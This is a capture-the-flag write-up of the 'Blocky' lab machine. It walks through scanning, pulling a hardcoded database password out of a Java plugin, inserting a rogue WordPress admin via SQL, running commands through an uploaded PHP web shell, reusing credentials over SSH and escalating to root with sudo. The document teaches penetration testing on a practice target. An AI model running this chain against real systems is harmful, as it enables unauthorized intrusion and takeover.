# Blocky - 10.10.10.37

## Nmap Scan
```
nmap -v -n -A 10.10.10.37
```
Results:
```
msf exploit(handler) > services -R 10.10.10.37

Services
========

host     	port  proto  name	state   info
----     	----  -----  ----	-----   ----
10.10.10.37  21	tcp	ftp 	open	ProFTPD 1.3.5a
10.10.10.37  22	tcp	ssh 	open	OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 Ubuntu Linux; protocol 2.0
10.10.10.37  80	tcp	http	open	Apache httpd 2.4.18 (Ubuntu)
10.10.10.37  8192  tcp	sophos  closed
```

### Apache server

Good stuff, let's start a bunch of scans and go watch a movie or something.
```sh
dirb http://10.10.10.37 /usr/share/dirb/wordlists/common.txt
```
```
uniscan -u 10.10.10.37 -qweds
```
```
wpscan 10.10.10.37
```

Meanwhile, trying to crack a password for WP or phpMyAdmin gives no result.

~30 minutes down and ```dirb``` gives something interesting, an index with 2 .jar files.
```
==> DIRECTORY: http://10.10.10.37/plugins/files/
```
The applications might contain some creds hardcoded.
```sh
grep -r "sql"
Binary file 1/me/ryanhamshire/griefprevention/DatabaseDataStore.class matches
Binary file com/myfirstplugin/BlockyCore.class matches
```
BlockyCore hits the mark
```
hexdump -C com/myfirstplugin/BlockyCore.class
...
00000060  3b 01 00 07 73 71 6c 55  73 65 72 01 00 07 73 71  |;...sqlUser...sq|
00000070  6c 50 61 73 73 01 00 06  3c 69 6e 69 74 3e 01 00  |lPass...<init>..|
00000080  03 28 29 56 01 00 04 43  6f 64 65 0a 00 03 00 0d  |.()V...Code.....|
00000090  0c 00 09 00 0a 08 00 0f  01 00 09 6c 6f 63 61 6c  |...........local|
000000a0  68 6f 73 74 09 00 01 00  11 0c 00 05 00 06 08 00  |host............|
000000b0  13 01 00 04 72 6f 6f 74  09 00 01 00 15 0c 00 07  |....root........|
000000c0  00 06 08 00 17 01 00 17  38 59 73 71 66 43 54 6e  |........8YsqfCTn|
000000d0  76 78 41 55 65 64 75 7a  6a 4e 53 58 65 32 32 09  |vxAUeduzjNSXe22.|
```

Awesome :tada: Having phpMyAdmin access, it becomes trivial to get a WP access.

Creating a new user
```sql
INSERT INTO `wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('1337', 'kingpin', MD5('toor'), '', 'kingpin@nsa.gov', '', '2017-09-01 00:00:00', '', '0', '');
```
Give admin privs
```sql
INSERT INTO `wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '1337', 'wp-capabilities', 'a:1:{s:13:"administrator";s:1:"1";}'), (NULL, '1337', 'wp_user_level', '10');
```

Since there is an access to admin account, upload a php shell to the website.
Here is a sample [shell plugin](https://github.com/leonjza/wordpress-shell). Alternatively make your own with ```msfvenom```.

Got www-data.

```bash
root@kingpin:~ curl -v "http://10.10.10.37/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"cmd":"uname -a; whoami"})')"
*   Trying 10.10.10.37...
* TCP_NODELAY set
* Connected to 10.10.10.37 (10.10.10.37) port 80 (#0)
> GET /wp-content/plugins/shell/shell.php?cmd=uname+-a%3B+whoami HTTP/1.1
> Host: 10.10.10.37
> User-Agent: curl/7.55.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Date: Tue, 31 Oct 2017 03:56:38 GMT
< Server: Apache/2.4.18 (Ubuntu)
< Vary: Accept-Encoding
< Content-Length: 114
< Content-Type: text/html; charset=UTF-8
<
Linux Blocky 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
www-data
* Connection #0 to host 10.10.10.37 left intact

```

Enumerate users on the system.
```bash
root@kingpin:~/Downloads/blocky# curl -v "http://10.10.10.37/wp-content/plugins/shell/shell.php?$(python -c 'import urllib; print urllib.urlencode({"cmd":"getent passwd"})')"
...
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
notch:x:1000:1000:notch,,,:/home/notch:/bin/bash #same as WP admin
mysql:x:110:117:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:111:65534::/run/proftpd:/bin/false
ftp:x:112:65534::/srv/ftp:/bin/false
sshd:x:113:65534::/var/run/sshd:/usr/sbin/nologin
```
There is an account ```notch```, the same username as Wordpress administrator. So the credentials from phpMyAdmin might be in use.

### SSH

Trying to login with phpMyAdmin creds.
```sh
root@kingpin:~$ ssh root@10.10.10.37 #no luck
root@10.10.10.37s password:
Permission denied, please try again.

root@kingpin:~/$ ssh notch@10.10.10.37 # username from WP
notch@10.10.10.37s password:
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management: 	https://landscape.canonical.com
 * Support:    	https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.

Last login: Tue Jul 25 11:14:53 2017 from 10.10.14.230
notch@Blocky:~$
```
## Getting root

The user appears to be a part of sudo group, thus can simply switch to root.

```
notch@Blocky:~$ groups notch
notch : notch adm cdrom sudo dip plugdev lxd lpadmin sambashare
notch@Blocky:~$ sudo su #sick privesc
[sudo] password for notch:
root@Blocky:/home/notch#
```
